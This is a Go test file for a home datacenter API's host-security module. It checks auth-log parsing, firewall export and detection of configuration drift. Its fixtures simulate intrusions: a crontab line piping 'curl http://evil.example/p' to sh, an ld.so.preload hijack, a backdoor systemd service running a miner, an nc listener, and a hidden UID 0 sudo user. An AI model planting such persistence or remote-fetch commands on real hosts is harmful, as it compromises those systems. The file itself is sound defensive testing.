package security

import (
	"context"
	"encoding/json"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"home-datacenter-api/internal/config"
	"home-datacenter-api/internal/eventbus"
	"home-datacenter-api/internal/hostsec"
)

type fakeAssetProvider struct {
	snap *hostsec.HostAssetSnapshot
}

func (f *fakeAssetProvider) CollectAssets(_ context.Context) (*hostsec.HostAssetSnapshot, error) {
	return f.snap, nil
}

func TestHostLogWatcher_ExpandedAuthPrivilegeParsingAndDualStackExport(t *testing.T) {
	tempDir := t.TempDir()
	logFile := filepath.Join(tempDir, "auth.log")
	exportFile := filepath.Join(tempDir, "blocked_ips.txt")

	db := setupTestDB(t)
	bus := eventbus.New()
	alertMgr := NewAlertManager(config.AlertConfig{Enabled: false})
	dm := NewDefenseManager(db, config.DefenseConfig{
		MaxAuthFailures:   2,
		FailureWindowMins: 5,
		BanDurationMins:   30,
	}, alertMgr, bus)

	hw := NewHostLogWatcher(dm, logFile, exportFile)
	defer hw.Stop()

	// 1. Parse keyboard-interactive root login
	eRoot := hw.parseLogLine("2026-11-11T08:15:30Z nas sshd[999]: Accepted keyboard-interactive/pam for root from 203.0.113.55 port 40001 ssh2")
	if eRoot == nil || eRoot.Status != "accepted" || eRoot.User != "root" || eRoot.Severity != "critical" || eRoot.Timestamp.Year() != 2026 {
		t.Fatalf("expected critical root keyboard-interactive login with parsed timestamp, got %+v", eRoot)
	}

	// 2. Parse sudo failure and useradd
	eSudo := hw.parseLogLine("Nov 11 08:16:00 nas sudo: pam_unix(sudo:auth): authentication failure; logname=momo uid=1000 tty=/dev/pts/0 ruser=momo rhost= user=momo")
	if eSudo == nil || eSudo.Status != "sudo_failed" || eSudo.User != "momo" {
		t.Fatalf("expected sudo_failed entry, got %+v", eSudo)
	}
	eUserAdd := hw.parseLogLine("Nov 11 08:17:00 nas useradd[4321]: new user: name=backdoor, UID=0, GID=0")
	if eUserAdd == nil || eUserAdd.Status != "user_change" || eUserAdd.Severity != "critical" {
		t.Fatalf("expected critical user_change entry, got %+v", eUserAdd)
	}

	// 3. Ban IPv4 and IPv6 and verify dual-stack export + script
	if err := dm.ManualBan("", "admin", "203.0.113.77", time.Hour, "test v4"); err != nil {
		t.Fatal(err)
	}
	if err := dm.ManualBan("", "admin", "2001:db8::99", time.Hour, "test v6"); err != nil {
		t.Fatal(err)
	}
	hw.ExportFirewallRules()

	expBytes, err := os.ReadFile(exportFile)
	if err != nil {
		t.Fatal(err)
	}
	expStr := string(expBytes)
	if !strings.Contains(expStr, "203.0.113.77") || !strings.Contains(expStr, "2001:db8::99") {
		t.Fatalf("expected both IPv4 and IPv6 in blocked_ips.txt, got:\n%s", expStr)
	}
	scriptBytes, err := os.ReadFile(filepath.Join(tempDir, "sync_host_firewall.sh"))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(scriptBytes), "ip6tables") || !strings.Contains(string(scriptBytes), "hash:net") {
		t.Fatalf("expected dual-stack hash:net script, got:\n%s", string(scriptBytes))
	}
}

func TestHostSecurityMonitor_DetectsAllR93DriftAndIntrusionSignals(t *testing.T) {
	hostRoot := t.TempDir()
	mustWrite := func(rel, content string) {
		p := filepath.Join(hostRoot, filepath.FromSlash(rel))
		if err := os.MkdirAll(filepath.Dir(p), 0755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(content), 0644); err != nil {
			t.Fatal(err)
		}
	}

	mustWrite("etc/ssh/sshd_config", "PermitRootLogin no\nPasswordAuthentication no\n")
	mustWrite("etc/crontab", "0 3 * * * root /usr/local/bin/backup.sh\n")
	mustWrite("etc/systemd/system/ssh.service", "[Unit]\nDescription=SSH\n")

	// Start a mock Unix Docker socket server on Linux or skip Unix socket test on Windows if unix listen unavailable
	sockPath := filepath.Join(t.TempDir(), "docker.sock")
	ln, sockErr := net.Listen("unix", sockPath)
	if sockErr == nil {
		defer ln.Close()
		srv := &http.Server{
			Handler: http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				switch r.URL.Path {
				case "/containers/json":
					_ = json.NewEncoder(w).Encode([]map[string]any{
						{"Id": "abc1234567890", "Names": []string{"/rogue-priv"}},
					})
				case "/containers/abc1234567890/json":
					_ = json.NewEncoder(w).Encode(map[string]any{
						"Name": "/rogue-priv",
						"HostConfig": map[string]any{
							"Privileged": true,
							"CapAdd":     []string{"SYS_ADMIN"},
							"PidMode":    "host",
							"Binds":      []string{"/:/host:rw"},
						},
					})
				}
			}),
		}
		go func() { _ = srv.Serve(ln) }()
		defer srv.Close()
	}

	db := setupTestDB(t)
	bus := eventbus.New()
	dm := NewDefenseManager(db, config.DefenseConfig{}, NewAlertManager(config.AlertConfig{Enabled: false}, db), bus)

	mon := NewHostSecurityMonitor(hostRoot, sockPath, dm, nil)
	snap := &hostsec.HostAssetSnapshot{
		Firewall: &hostsec.FirewallStatus{
			Backend:             "ufw",
			Active:              true,
			DefaultInputPolicy:  "DROP",
			BlocklistSetPresent: true,
			RulesSummary:        []string{"22/tcp ALLOW IN"},
		},
		ListeningPorts: []hostsec.ListeningPort{
			{Protocol: "tcp", LocalAddr: "0.0.0.0", LocalPort: 22, IsWildcard: true, ProcessName: "sshd"},
		},
		Users: []hostsec.HostUserInfo{
			{Username: "root", UID: 0, Shell: "/bin/bash", IsRootUID: true},
			{Username: "momo", UID: 1000, Shell: "/bin/bash", HasSudo: true, Groups: []string{"sudo"}},
		},
		SystemdServices: []hostsec.SystemdServiceStatus{
			{Unit: "ssh.service", LoadState: "loaded", ActiveState: "active", SubState: "running"},
		},
	}
	mon.SetProvider(&fakeAssetProvider{snap: snap})

	// Pass 1: Baseline + immediate detections (privileged container if unix socket supported)
	findings1, err := mon.ScanOnce(context.Background())
	if err != nil {
		t.Fatalf("ScanOnce pass 1 failed: %v", err)
	}
	if sockErr == nil {
		foundPriv := false
		for _, f := range findings1 {
			if f.Category == CatPrivilegedContainer {
				foundPriv = true
			}
		}
		if !foundPriv {
			t.Fatalf("expected CatPrivilegedContainer on pass 1, got %+v", findings1)
		}
	}

	// Mutate host posture across SSH config, ports, firewall, systemd, users/sudo, and persistence
	mustWrite("etc/ssh/sshd_config", "PermitRootLogin yes\nPermitEmptyPasswords yes\n")
	mustWrite("etc/crontab", "0 3 * * * root /usr/local/bin/backup.sh\n* * * * * root curl http://evil.example/p | sh\n")
	mustWrite("etc/ld.so.preload", "/tmp/evil.so\n")
	mustWrite("etc/systemd/system/evil-backdoor.service", "[Service]\nExecStart=/tmp/miner\n")

	snap.ListeningPorts = append(snap.ListeningPorts, hostsec.ListeningPort{
		Protocol: "tcp", LocalAddr: "0.0.0.0", LocalPort: 4444, IsWildcard: true, ProcessName: "nc", PID: 31337,
	})
	snap.Firewall.DefaultInputPolicy = "ACCEPT"
	snap.Firewall.BlocklistSetPresent = false
	snap.Users = append(snap.Users, hostsec.HostUserInfo{
		Username: "shadowroot", UID: 0, Shell: "/bin/bash", IsRootUID: true, HasSudo: true, SudoRules: []string{"shadowroot ALL=(ALL) NOPASSWD: ALL"},
	})
	snap.SystemdServices = append(snap.SystemdServices, hostsec.SystemdServiceStatus{
		Unit: "evil-backdoor.service", LoadState: "loaded", ActiveState: "active", SubState: "running",
	})

	findings2, err := mon.ScanOnce(context.Background())
	if err != nil {
		t.Fatalf("ScanOnce pass 2 failed: %v", err)
	}

	cats := make(map[HostSecurityCategory]bool)
	for _, f := range findings2 {
		cats[f.Category] = true
	}
	required := []HostSecurityCategory{
		CatSSHConfigDrift,
		CatAnomalousPort,
		CatFirewallDrift,
		CatAnomalousSystemd,
		CatUserSudoDrift,
		CatPersistenceDrift,
	}
	for _, c := range required {
		if !cats[c] {
			t.Errorf("expected category %s in pass 2 findings, got categories=%+v", c, cats)
		}
	}
}
